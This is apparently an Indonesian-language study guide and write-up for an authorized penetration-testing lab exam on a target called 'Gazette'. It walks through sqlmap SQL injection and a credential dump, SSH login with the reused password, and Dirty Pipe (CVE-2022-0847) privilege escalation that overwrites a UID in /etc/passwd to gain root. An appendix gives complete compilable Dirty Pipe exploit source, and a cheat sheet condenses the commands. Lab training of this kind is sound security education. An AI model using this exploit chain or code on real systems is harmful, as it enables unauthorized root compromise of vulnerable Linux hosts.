# Write-Up Lab Gazette — Panduan Ujian Close Book

> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

## 0. Cara Menggunakan Catatan Ini

Pelajari dokumen ini dalam tiga lapisan:

```text
Lapisan 1: hafalkan rantai serangan dan mnemonic.
Lapisan 2: hafalkan indikator berhasil pada setiap fase.
Lapisan 3: latih command pada Cheat Sheet 60 Detik.
```

Kode C Dirty Pipe tidak perlu dihafal baris demi baris. Pahami fungsi dan cara penggunaannya. Source code lengkap tetap tersedia pada **Lampiran A** untuk latihan sebelum ujian.

---

## 1. Peta Serangan

| Komponen | Nilai |
|---|---|
| Target web | `http://192.168.56.121:8000` |
| Celah awal | SQL Injection pada parameter `id` |
| Credential | `editor:password123` |
| Foothold | SSH sebagai `editor` |
| Privilege escalation | Dirty Pipe / CVE-2022-0847 |
| Akses akhir | UID `editor` diubah menjadi `0` |

### Rantai Serangan

```text
SQL Injection
→ dump credential
→ password reuse ke SSH
→ cek kernel
→ Dirty Pipe
→ ubah UID editor menjadi 0
→ root
→ restore /etc/passwd
```

### Mnemonic: S-D-S-K-P-R

```text
S = SQL Injection
D = Dump credential
S = SSH
K = Kernel check
P = Pipe exploit
R = Root
```

### Checkpoint Ujian

| Fase | Indikator yang Dicari |
|---|---|
| SQLi | Parameter `id` injectable, DBMS MariaDB/MySQL |
| Dump | Database `gazette`, tabel `users`, credential editor |
| SSH | `uid=1001(editor)` |
| Kernel | Linux `5.10.70-1` |
| Dirty Pipe | UID pada `/etc/passwd` berubah menjadi `0000` |
| Root | `uid=0(root)` |
| Restore | UID editor kembali menjadi `1001` |

---

# Fase 1 — SQL Injection dan Credential

## 2. Tujuan

Membuktikan SQL Injection dan memperoleh credential yang dapat digunakan untuk akses SSH.

## 3. Validasi SQL Injection

```bash
URL="http://192.168.56.121:8000/news/detail?id=1"

sqlmap \
  -u "$URL" \
  -p id \
  --batch \
  --technique=U
```

Indikator penting:

```text
Parameter id injectable
UNION query
MariaDB/MySQL
```

## 4. Enumerasi Database: D-T-D

Cari database:

```bash
sqlmap -u "$URL" -p id --batch --dbs
```

Hasil:

```text
gazette
```

Cari tabel:

```bash
sqlmap -u "$URL" -p id --batch \
  -D gazette \
  --tables
```

Hasil penting:

```text
users
```

Dump credential:

```bash
sqlmap -u "$URL" -p id --batch \
  -D gazette \
  -T users \
  --dump
```

Credential:

```text
Username : editor
Password : password123
```

### Rumus Hafalan SQLMap

```text
D-T-D
Database → Tables → Dump
```

---

# Fase 2 — SSH dan Kernel Check

## 5. Tujuan

Mengubah credential aplikasi menjadi foothold sistem dan memeriksa apakah kernel sesuai dengan jalur Dirty Pipe.

## 6. Login SSH

```bash
ssh editor@192.168.56.121
```

Password:

```text
password123
```

Verifikasi:

```bash
id
whoami
hostname
```

Indikator:

```text
uid=1001(editor) gid=1001(editor)
```

## 7. Periksa Sudo dan Kernel

```bash
sudo -l
uname -a
cat /proc/version
```

Temuan lab:

```text
editor tidak memiliki akses sudo
Linux 5.10.70-1
```

Makna:

```text
Tidak ada jalur sudo.
Versi kernel menjadi petunjuk untuk memeriksa Dirty Pipe.
Versi kernel bukan bukti akhir; PoC tetap harus divalidasi pada lab.
```

---

# Fase 3 — Menyiapkan Dirty Pipe

## 8. Tujuan

Membuat backup file target, menyiapkan PoC, dan mengompilasi exploit.

## 9. Backup `/etc/passwd`

Jangan lewati langkah ini:

```bash
cp /etc/passwd ~/passwd.bak
ls -l ~/passwd.bak
```

## 10. Buat Source Code

Gunakan source code pada [Lampiran A](#lampiran-a--source-code-dirty-pipe).

Simpan sebagai:

```text
/home/editor/dirtypipe.c
```

Kompilasi:

```bash
cd /home/editor
gcc -O2 -Wall dirtypipe.c -o dirtypipe
```

Validasi:

```bash
ls -l dirtypipe
file dirtypipe
```

Indikator:

```text
File executable dirtypipe berhasil dibuat.
```

## 11. Konsep yang Wajib Dipahami

Dirty Pipe digunakan untuk menimpa data pada file yang normalnya hanya dapat dibaca oleh user biasa.

Batasan penting PoC:

```text
1. Offset harus lebih besar dari 0.
2. Offset tidak boleh tepat di batas halaman 4096 byte.
3. Data tidak boleh melewati batas halaman.
4. Panjang data pengganti sebaiknya sama dengan data lama.
```

---

# Fase 4 — Mengubah UID Menjadi 0

## 12. Tujuan

Menemukan posisi UID user `editor` pada `/etc/passwd`, lalu menimpanya menjadi UID 0.

## 13. Cari Offset Baris `editor`

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

Hasil lab:

```text
2183:editor:x:1001:1001
```

Posisi UID dimulai sembilan byte setelah awal string:

```text
2183 + 9 = 2192
```

Visual:

```text
editor:x:1001:1001
         ^
         offset UID
```

> Jangan menghafal `2192` sebagai nilai universal. Offset bergantung pada isi `/etc/passwd` target. Hafalkan cara menghitungnya.

## 14. Timpa `1001` Menjadi `0000`

```bash
./dirtypipe /etc/passwd 2192 0000
```

Verifikasi:

```bash
grep '^editor:' /etc/passwd
```

Hasil:

```text
editor:x:0000:1001::/home/editor:/bin/bash
```

Mengapa memakai `0000`:

```text
1001 = empat karakter
0000 = empat karakter
```

Dirty Pipe menimpa data dengan panjang yang sama tanpa menggeser struktur file.

---

# Fase 5 — Root dan Pemulihan

## 15. Tujuan

Memulai sesi baru sebagai user dengan UID 0, membuktikan root, kemudian memulihkan `/etc/passwd`.

## 16. Menjadi Root

Jangan keluar dari sesi SSH lama sebelum pemulihan selesai.

```bash
su - editor
```

Masukkan:

```text
password123
```

Verifikasi:

```bash
id
whoami
```

Indikator:

```text
uid=0(root)
root
```

## 17. Pulihkan `/etc/passwd`

Setelah root terbukti:

```bash
install -o root -g root -m 0644 \
  /home/editor/passwd.bak \
  /etc/passwd
```

Verifikasi:

```bash
grep '^editor:' /etc/passwd
```

Hasil normal:

```text
editor:x:1001:1001::/home/editor:/bin/bash
```

---

# 18. Troubleshooting Inti

### SQLMap tidak mendeteksi SQL Injection

Pastikan parameter yang diuji adalah `id` dan gunakan URL lengkap:

```bash
sqlmap -u "$URL" -p id --batch --level=3 --risk=2
```

### SSH gagal walaupun credential sudah ditemukan

Periksa port SSH:

```bash
nmap -Pn -sV -p22 192.168.56.121
```

### `gcc: command not found`

Periksa compiler alternatif atau paket yang tersedia:

```bash
which gcc cc clang
```

### PoC menghasilkan error offset

Ulangi pencarian offset:

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

Hitung posisi UID dari output aktual. Jangan memakai offset contoh apabila isi file berbeda.

### `su - editor` tidak menghasilkan root

Periksa hasil perubahan:

```bash
grep '^editor:' /etc/passwd
```

UID harus terbaca sebagai `0000` atau `0`.

---

# 19. Cleanup

Setelah `/etc/passwd` pulih, hapus artefak pengujian:

```bash
rm -f /home/editor/dirtypipe \
      /home/editor/dirtypipe.c \
      /home/editor/passwd.bak
```

Pastikan:

```bash
grep '^editor:' /etc/passwd
id editor
```

---

# 20. Cheat Sheet 60 Detik

```bash
# 1. SQLi dan dump
URL="http://192.168.56.121:8000/news/detail?id=1"
sqlmap -u "$URL" -p id --batch --dbs
sqlmap -u "$URL" -p id --batch -D gazette --tables
sqlmap -u "$URL" -p id --batch -D gazette -T users --dump

# 2. SSH
ssh editor@192.168.56.121
# password123

# 3. Kernel dan backup
cat /proc/version
cp /etc/passwd ~/passwd.bak

# 4. Compile PoC
gcc -O2 -Wall dirtypipe.c -o dirtypipe

# 5. Cari offset dan ubah UID
grep -bo 'editor:x:1001:1001' /etc/passwd
./dirtypipe /etc/passwd 2192 0000

# 6. Root
su - editor
id
whoami

# 7. Restore
install -o root -g root -m 0644 ~/passwd.bak /etc/passwd
```

---

# 21. Checklist Ujian

```text
[ ] Parameter id terbukti injectable
[ ] Database gazette ditemukan
[ ] Tabel users ditemukan
[ ] Credential editor diperoleh
[ ] SSH berhasil sebagai editor
[ ] Kernel diperiksa
[ ] /etc/passwd dibackup
[ ] PoC berhasil dikompilasi
[ ] Offset dihitung dari target aktual
[ ] UID editor berubah menjadi 0000
[ ] uid=0(root) terbukti
[ ] /etc/passwd dipulihkan
[ ] Artefak pengujian dihapus
```

## Kalimat Hafalan

```text
SQLi, dump editor, SSH, cek kernel, backup passwd,
cari offset, ubah 1001 menjadi 0000, su editor, root, restore.
```

---

# Lampiran A — Source Code Dirty Pipe

Simpan kode berikut sebagai `/home/editor/dirtypipe.c`.

```c
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Adapted from the Dirty Pipe CVE-2022-0847 proof of concept.
 * Original author: Max Kellermann <max.kellermann@ionos.com>
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * Modified for an authorized security lab.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static void die(const char *message)
{
    perror(message);
    exit(EXIT_FAILURE);
}

static void prepare_pipe(int pipe_fd[2])
{
    if (pipe(pipe_fd) != 0) {
        die("pipe");
    }

    const unsigned int pipe_size =
        (unsigned int)fcntl(pipe_fd[1], F_GETPIPE_SZ);

    static char buffer[4096];

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (write(pipe_fd[1], buffer, size) != (ssize_t)size) {
            die("write pipe");
        }

        remaining -= size;
    }

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (read(pipe_fd[0], buffer, size) != (ssize_t)size) {
            die("read pipe");
        }

        remaining -= size;
    }
}

int main(int argc, char **argv)
{
    if (argc != 4) {
        fprintf(
            stderr,
            "Usage: %s TARGET_FILE OFFSET DATA\n",
            argv[0]
        );
        return EXIT_FAILURE;
    }

    const char *target_path = argv[1];
    loff_t offset = strtoll(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    if (offset <= 0) {
        fprintf(stderr, "Offset harus lebih besar dari 0\n");
        return EXIT_FAILURE;
    }

    if ((offset % 4096) == 0) {
        fprintf(
            stderr,
            "Offset tidak boleh tepat di batas halaman\n"
        );
        return EXIT_FAILURE;
    }

    loff_t next_page = (offset | 4095) + 1;

    if (offset + (loff_t)data_size > next_page) {
        fprintf(
            stderr,
            "Data melewati batas halaman 4096 byte\n"
        );
        return EXIT_FAILURE;
    }

    int target_fd = open(target_path, O_RDONLY);

    if (target_fd < 0) {
        die("open");
    }

    struct stat target_stat;

    if (fstat(target_fd, &target_stat) != 0) {
        die("fstat");
    }

    if (offset + (loff_t)data_size > target_stat.st_size) {
        fprintf(stderr, "Data melewati ukuran file\n");
        return EXIT_FAILURE;
    }

    int pipe_fd[2];
    prepare_pipe(pipe_fd);

    loff_t splice_offset = offset - 1;

    if (
        splice(
            target_fd,
            &splice_offset,
            pipe_fd[1],
            NULL,
            1,
            0
        ) != 1
    ) {
        die("splice");
    }

    ssize_t written = write(pipe_fd[1], data, data_size);

    if (written < 0) {
        die("write");
    }

    if ((size_t)written != data_size) {
        fprintf(
            stderr,
            "Short write: %zd dari %zu byte\n",
            written,
            data_size
        );
        return EXIT_FAILURE;
    }

    printf(
        "Berhasil menulis %zu byte pada offset %lld\n",
        data_size,
        (long long)offset
    );

    close(target_fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);

    return EXIT_SUCCESS;
}
```
